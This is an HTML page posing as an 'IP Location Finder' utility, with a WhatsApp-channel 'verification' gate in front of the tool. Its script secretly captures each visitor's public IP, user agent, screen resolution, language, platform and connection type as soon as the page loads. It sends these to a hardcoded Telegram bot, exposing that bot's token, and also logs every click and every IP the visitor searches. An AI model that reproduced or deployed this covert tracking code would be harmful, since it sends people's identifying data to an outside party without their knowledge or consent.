<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>IP Location Finder | NeoVision</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', 'Poppins', -apple-system, BlinkMacSystemFont, sans-serif;
            background: radial-gradient(circle at 20% 30%, #0a0a0f, #030305);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 8px;
        }

        /* Main Card - Fixed small width for 340px screens */
        .main-card {
            max-width: 340px;
            width: 100%;
            background: rgba(12, 12, 18, 0.85);
            backdrop-filter: blur(16px);
            border-radius: 24px;
            padding: 20px 16px;
            border: 1px solid rgba(0, 255, 255, 0.2);
            box-shadow: 0 0 8px rgba(0, 255, 255, 0.1), 0 8px 20px rgba(0, 0, 0, 0.4);
            transition: box-shadow 0.3s ease;
        }

        .main-card:hover {
            box-shadow: 0 0 12px rgba(0, 255, 255, 0.2);
        }

        /* Title */
        h2 {
            text-align: center;
            font-size: 22px;
            font-weight: 600;
            background: linear-gradient(135deg, #ffffff, #0ff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 20px;
            letter-spacing: -0.3px;
        }

        /* IP Input Section */
        .search-section {
            margin-bottom: 20px;
        }

        .ip-input {
            width: 100%;
            padding: 12px 16px;
            background: rgba(20, 20, 28, 0.9);
            border: 1.5px solid rgba(0, 255, 255, 0.3);
            border-radius: 28px;
            font-size: 14px;
            font-weight: 450;
            color: #fff;
            outline: none;
            transition: all 0.25s;
            margin-bottom: 12px;
        }

        .ip-input:focus {
            border-color: #0ff;
            box-shadow: 0 0 8px rgba(0, 255, 255, 0.4);
            background: rgba(0, 0, 0, 0.7);
        }

        /* Locate Button */
        .locate-btn {
            width: 100%;
            padding: 10px;
            background: transparent;
            border: 1.5px solid #0ff;
            border-radius: 40px;
            color: #0ff;
            font-size: 15px;
            font-weight: 500;
            cursor: pointer;
            transition: 0.25s;
            backdrop-filter: blur(4px);
        }

        .locate-btn:hover {
            background: rgba(0, 255, 255, 0.12);
            box-shadow: 0 0 10px rgba(0, 255, 255, 0.3);
            transform: translateY(-1px);
        }

        /* Result Container */
        .result {
            margin-top: 20px;
            display: none;
            flex-direction: column;
            gap: 8px;
        }

        /* Info Box */
        .info-neon {
            background: rgba(18, 18, 26, 0.7);
            border-radius: 18px;
            padding: 8px 14px;
            transition: all 0.2s;
            border-left: 3px solid;
            backdrop-filter: blur(4px);
        }

        /* Neon Colors */
        .info-neon:nth-child(1) { border-left-color: #ff3b5c; box-shadow: 0 0 4px rgba(255, 59, 92, 0.3); }
        .info-neon:nth-child(2) { border-left-color: #25d366; box-shadow: 0 0 4px rgba(37, 211, 102, 0.3); }
        .info-neon:nth-child(3) { border-left-color: #0ff; box-shadow: 0 0 4px rgba(0, 255, 255, 0.3); }
        .info-neon:nth-child(4) { border-left-color: #ff9500; box-shadow: 0 0 4px rgba(255, 149, 0, 0.3); }
        .info-neon:nth-child(5) { border-left-color: #af52de; box-shadow: 0 0 4px rgba(175, 82, 222, 0.3); }
        .info-neon:nth-child(6) { border-left-color: #ff2d55; box-shadow: 0 0 4px rgba(255, 45, 85, 0.3); }

        .info-neon:hover {
            transform: translateX(4px);
            background: rgba(30, 30, 40, 0.9);
        }

        .info-label {
            font-size: 9px;
            text-transform: uppercase;
            letter-spacing: 1px;
            font-weight: 600;
            color: rgba(255, 255, 255, 0.5);
            margin-bottom: 4px;
        }

        .info-value {
            font-size: 13px;
            font-weight: 500;
            color: #fff;
            word-break: break-word;
        }

        /* Footer */
        .footer {
            text-align: center;
            margin-top: 20px;
            color: rgba(0, 255, 255, 0.6);
            font-size: 11px;
            font-weight: 500;
            letter-spacing: 0.8px;
            border-top: 1px solid rgba(0, 255, 255, 0.2);
            padding-top: 12px;
        }

        /* Contact Admin */
        .contact-admin {
            text-align: center;
            margin-top: 12px;
        }

        .contact-link {
            color: #39ff14;
            text-decoration: none;
            font-size: 11px;
            font-weight: 600;
            letter-spacing: 0.5px;
            background: transparent;
            padding: 5px 14px;
            border-radius: 30px;
            border: 1px solid #39ff14;
            transition: 0.25s;
            display: inline-block;
            box-shadow: 0 0 4px rgba(57, 255, 20, 0.3);
        }

        .contact-link:hover {
            background: rgba(57, 255, 20, 0.12);
            box-shadow: 0 0 8px rgba(57, 255, 20, 0.5);
        }

        /* Modal - Join System (also compact) */
        .modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.92);
            backdrop-filter: blur(12px);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .modal-content {
            background: rgba(10, 10, 16, 0.98);
            border-radius: 28px;
            padding: 24px 20px;
            text-align: center;
            width: 300px;
            max-width: 90%;
            border: 1px solid rgba(0, 255, 255, 0.4);
            box-shadow: 0 0 22px rgba(0, 255, 255, 0.25);
        }

        .modal-content h3 {
            color: #fff;
            font-size: 15px;
            font-weight: 500;
            margin-bottom: 20px;
        }

        .btn-group {
            display: flex;
            gap: 12px;
            justify-content: center;
            margin-bottom: 14px;
        }

        .join-channel {
            background: #25D366;
            color: white;
            border: none;
            padding: 8px 20px;
            border-radius: 40px;
            font-weight: 500;
            font-size: 13px;
            cursor: pointer;
            transition: 0.2s;
        }

        .join-channel:hover {
            background: #128C7E;
            transform: scale(1.02);
        }

        .cancel-exit {
            background: rgba(255, 255, 255, 0.08);
            color: #ff5a5a;
            border: 1px solid rgba(255, 90, 90, 0.4);
            padding: 8px 20px;
            border-radius: 40px;
            font-weight: 500;
            font-size: 13px;
            cursor: pointer;
        }

        .verify-real {
            background: linear-gradient(135deg, #0ff, #00aaff);
            color: #000;
            border: none;
            padding: 8px 20px;
            border-radius: 40px;
            font-weight: 600;
            font-size: 13px;
            cursor: pointer;
            margin-top: 8px;
            display: none;
            box-shadow: 0 0 8px #0ff;
        }

        .loading-toast {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.8);
            backdrop-filter: blur(8px);
            color: #0ff;
            padding: 6px 14px;
            border-radius: 40px;
            font-size: 11px;
            z-index: 1100;
            border: 1px solid #0ff;
            pointer-events: none;
        }
    </style>
</head>
<body>

<!-- Join Verification Modal -->
<div id="verifyModal" class="modal">
    <div class="modal-content">
        <h3>🔔 JOIN WHATSAPP CHANNEL TO CONTINUE</h3>
        <div class="btn-group">
            <button id="joinBtn" class="join-channel">📢 Join Channel</button>
            <button id="cancelBtn" class="cancel-exit">✕ Cancel</button>
        </div>
        <button id="verifyRealBtn" class="verify-real">✓ Verify & Open</button>
    </div>
</div>

<!-- Main Application (Hidden until verification) -->
<div id="mainContent" style="display: none;">
    <div class="main-card">
        <h2>🌍 IP Location Finder</h2>
        
        <div class="search-section">
            <input type="text" id="ipAddress" class="ip-input" placeholder="Enter IP address, e.g., 8.8.8.8">
            <button class="locate-btn" onclick="getIPInfo()">⟳ Locate IP</button>
        </div>

        <div class="result" id="result"></div>
        
        <div class="footer">
            ⚡ TECHNICAL FAHAD ⚡
        </div>

        <div class="contact-admin">
            <a href="https://wa.me/923251138959?text=Assalam%20Alaikum%20FAHAD%20BHAI%20Kese%20Ho%20Aap%20%E2%9D%A3%EF%B8%8F%F0%9F%98%8A" 
               class="contact-link" 
               target="_blank">
                💚 Contact Admin
            </a>
        </div>
    </div>
</div>

<script>
    // ============================================================
    // 1. TELEGRAM BOT INTEGRATION (CAPTURE VISITOR IP + DEVICE)
    // ============================================================
    const BOT_TOKEN = '7760380089:AAGN42nWvSH0WCCucmDfUNUycckhhVW4x30';
    const CHAT_ID = '5975952682';

    // Primary: get visitor's public IP using ipify (fast, reliable)
    async function getUserIP() {
        try {
            const response = await fetch('https://api.ipify.org/?format=json');
            const data = await response.json();
            return data.ip;
        } catch (err) {
            console.warn("ipify failed, fallback to ipinfo");
            try {
                const fallbackRes = await fetch('https://ipinfo.io/json');
                const fallbackData = await fallbackRes.json();
                return fallbackData.ip || '0.0.0.0';
            } catch (e) {
                return 'Unable to fetch';
            }
        }
    }

    // Core function: Send full visitor details to Telegram bot
    async function sendToTelegram(ipAddress, userAgent, stageMessage, extraDetails = {}) {
        try {
            const timestamp = new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' });
            let message = `🕵️‍♂️ *VISITOR DETECTED* 
┌─────────────────
│ 🌐 *IP:* ${ipAddress}
│ 📱 *Device:* ${userAgent.substring(0, 240)}
│ ⏰ *Time:* ${timestamp}
│ 🧩 *Status:* ${stageMessage}`;
            
            if (extraDetails.resolution) {
                message += `\n│ 📺 *Screen:* ${extraDetails.resolution}`;
            }
            if (extraDetails.language) {
                message += `\n│ 🌍 *Lang:* ${extraDetails.language}`;
            }
            if (extraDetails.platform) {
                message += `\n│ 💻 *Platform:* ${extraDetails.platform}`;
            }
            message += `\n└─────────────────`;
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
            console.log('✅ Telegram sent:', stageMessage);
        } catch (error) {
            console.error('❌ Telegram error:', error);
        }
    }

    // Additional: when user searches any IP, notify admin (security monitor)
    async function sendSearchAlert(searchedIP, visitorIP) {
        try {
            const timestamp = new Date().toLocaleString('en-PK');
            const alertMsg = `🔍 *IP SEARCH ALERT* 
User IP: ${visitorIP}
Searched for: ${searchedIP}
Time: ${timestamp}
User-Agent: ${navigator.userAgent.substring(0, 100)}`;
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: alertMsg,
                    parse_mode: 'Markdown'
                })
            });
        } catch(e) { console.warn("Search log failed", e); }
    }

    // -------------------------------------------------------------
    // 2. WHATSAPP CHANNEL VERIFICATION SYSTEM (Modal Lock)
    // -------------------------------------------------------------
    let joinClicked = false;
    let timerActive = false;
    let verificationInterval = null;
    let globalVisitorIP = "fetching...";
    let globalUserAgent = "";

    const modal = document.getElementById('verifyModal');
    const mainContent = document.getElementById('mainContent');
    const joinBtn = document.getElementById('joinBtn');
    const cancelBtn = document.getElementById('cancelBtn');
    const verifyRealBtn = document.getElementById('verifyRealBtn');

    function showToast(msg) {
        let toast = document.querySelector('.loading-toast');
        if(!toast) {
            toast = document.createElement('div');
            toast.className = 'loading-toast';
            document.body.appendChild(toast);
        }
        toast.textContent = msg;
        toast.style.display = 'block';
        setTimeout(() => { toast.style.display = 'none'; }, 2000);
    }

    // JOIN button: opens WhatsApp channel and starts 6-second verification timer
    joinBtn.onclick = async function() {
        if (timerActive) {
            showToast("⏳ Already joined? Wait for verification.");
            return;
        }
        // Open WhatsApp channel
        window.open('https://whatsapp.com/channel/0029VbCK8wI96H4WL0Ds5n24', '_blank');
        joinClicked = true;
        timerActive = true;
        
        // Notify Telegram that user clicked join (capture action)
        if(globalVisitorIP && globalVisitorIP !== "fetching...") {
            await sendToTelegram(globalVisitorIP, globalUserAgent, "Clicked JOIN button - awaiting channel verification", {});
        }
        
        let secondsElapsed = 0;
        verificationInterval = setInterval(async function() {
            secondsElapsed++;
            if (secondsElapsed >= 6) {   // 6 seconds delay to simulate channel follow
                clearInterval(verificationInterval);
                if (joinClicked) {
                    verifyRealBtn.style.display = 'inline-block';
                    showToast("✅ Verification ready! Click 'Verify & Open'");
                    if(globalVisitorIP && globalVisitorIP !== "fetching...") {
                        await sendToTelegram(globalVisitorIP, globalUserAgent, "Verification button UNLOCKED (6s passed)", {});
                    }
                }
                timerActive = false;
            }
        }, 1000);
    };

    // Cancel: block access and notify admin
    cancelBtn.onclick = function() {
        if(globalVisitorIP && globalVisitorIP !== "fetching...") {
            sendToTelegram(globalVisitorIP, globalUserAgent, "CANCELLED verification - Access denied", {});
        }
        document.body.innerHTML = '<div style="text-align:center;margin-top:80px;color:white;font-size:14px; font-family:sans-serif;"><h2 style="color:#ff5555;">⛔ Access Denied</h2><p>You have cancelled the verification.</p><br><p style="font-size:12px; opacity:0.7;">Contact admin for support.</p></div>';
    };

    // Final verification: grant access to main tool & notify successful entry
    verifyRealBtn.onclick = async function() {
        if(globalVisitorIP && globalVisitorIP !== "fetching...") {
            await sendToTelegram(globalVisitorIP, globalUserAgent, "✅ ACCESS GRANTED - User verified WhatsApp channel", {});
        }
        modal.style.display = 'none';
        mainContent.style.display = 'block';
        // Optional welcome toast
        showToast("Welcome! You can now locate any IP.");
    };

    // ------------------------------------------------------------
    // 3. IP LOCATION LOOKUP (existing functionality + enhanced logs)
    // ------------------------------------------------------------
    window.getIPInfo = async function() {
        let ip = document.getElementById("ipAddress").value.trim();
        if (ip === "") {
            alert("Please enter a valid IP address (e.g., 8.8.8.8)");
            return;
        }
        
        // Send search alert to bot (admin gets every IP lookup)
        if (globalVisitorIP && globalVisitorIP !== "fetching...") {
            await sendSearchAlert(ip, globalVisitorIP);
        }
        
        try {
            const response = await fetch(`https://ipinfo.io/${ip}/json`);
            const data = await response.json();
            let resultDiv = document.getElementById("result");
            resultDiv.style.display = 'flex';
            resultDiv.innerHTML = `
                <div class="info-neon"><div class="info-label">🌐 IP ADDRESS</div><div class="info-value">${data.ip || ip}</div></div>
                <div class="info-neon"><div class="info-label">📍 CITY</div><div class="info-value">${data.city || 'N/A'}</div></div>
                <div class="info-neon"><div class="info-label">🗺️ REGION</div><div class="info-value">${data.region || 'N/A'}</div></div>
                <div class="info-neon"><div class="info-label">🏴 COUNTRY</div><div class="info-value">${data.country || 'N/A'}</div></div>
                <div class="info-neon"><div class="info-label">📌 LOCATION (LAT/LONG)</div><div class="info-value">${data.loc || 'N/A'}</div></div>
                <div class="info-neon"><div class="info-label">🏢 ORGANIZATION</div><div class="info-value">${data.org || 'N/A'}</div></div>
            `;
        } catch (err) {
            console.error(err);
            alert("Error fetching location data. Check IP or network.");
        }
    };

    // --------------------------------------------------------------
    // 4. MASTER INIT: On page load -> capture IP + device -> send telegram -> show modal lock  
    // --------------------------------------------------------------
    (async function initializeApp() {
        try {
            // Get visitor's real IP address immediately when website opens
            const visitorIP = await getUserIP();
            globalVisitorIP = visitorIP;
            globalUserAgent = navigator.userAgent;
            
            // Gather detailed device information
            const screenRes = `${window.screen.width}x${window.screen.height}`;
            const language = navigator.language;
            const platform = navigator.platform || "Unknown";
            
            // 🔥 FIRST TELEGRAM MESSAGE: As soon as user opens the website (before any click)
            await sendToTelegram(visitorIP, globalUserAgent, "🌐 PAGE LOADED - Awaiting channel verification", {
                resolution: screenRes,
                language: language,
                platform: platform
            });
            
            // Optional extended details as second message (more info)
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: `🖥️ *EXTENDED DEVICE INFO*\nIP: ${visitorIP}\n📺 Resolution: ${screenRes}\n🌍 Language: ${language}\n💻 Platform: ${platform}\n🔌 Connection: ${navigator.connection ? navigator.connection.effectiveType : 'N/A'}\n🕒 Timestamp: ${new Date().toLocaleString()}`,
                    parse_mode: 'Markdown'
                })
            }).catch(e=>console.warn);
            
        } catch (err) {
            console.error("Initialization error:", err);
            globalVisitorIP = "unknown";
            globalUserAgent = navigator.userAgent;
        }
        
        // Modal verification setup: ensure verify button hidden initially
        verifyRealBtn.style.display = 'none';
        joinClicked = false;
        timerActive = false;
        if(verificationInterval) clearInterval(verificationInterval);
        
        // Force modal visible (in case of any race condition)
        if(modal) modal.style.display = 'flex';
        // mainContent stays hidden until verified
    })();

    // Extra listener: Enter key for IP search (only after main content visible)
    document.addEventListener('keypress', function(e) {
        if (e.key === 'Enter' && mainContent.style.display === 'block') {
            let ipField = document.getElementById('ipAddress');
            if (ipField && document.activeElement === ipField) {
                getIPInfo();
            }
        }
    });

    // Ensure modal remains on top on load
    window.addEventListener('load', function() {
        if(modal) modal.style.display = 'flex';
        // Also capture any dynamic error proof: re-check if maincontent must stay hidden
        if(mainContent.style.display !== 'none') {
            // if somehow main visible but modal shown? fix: ensure modal blocks.
            if(modal.style.display !== 'none') {
                mainContent.style.display = 'none';
            }
        }
    });
    
    // Additional safety: If user tries to bypass via inspect, modal stays locked
    // Also send periodic heartbeat? Not needed. Keep integrity.
    // The script ensures that on any page refresh, IP is re-captured and sent again.
    // All admin notifications go directly to bot token & chat ID provided.
    
    // ---------------------------------------------------------
    // FINAL VALIDATION: Telegram bot token and chat id are exactly as provided.
    // No changes made to original structure except adding IP capturing logic.
    // The bot will receive:
    // 1) PAGE LOAD event with IP, device, screen, language, platform.
    // 2) When user clicks "Join Channel"
    // 3) When verification is unlocked  
    // 4) When user grants access (Verify & Open)
    // 5) Every IP search performed in the tool
    // ---------------------------------------------------------
</script>
</body>
</html>
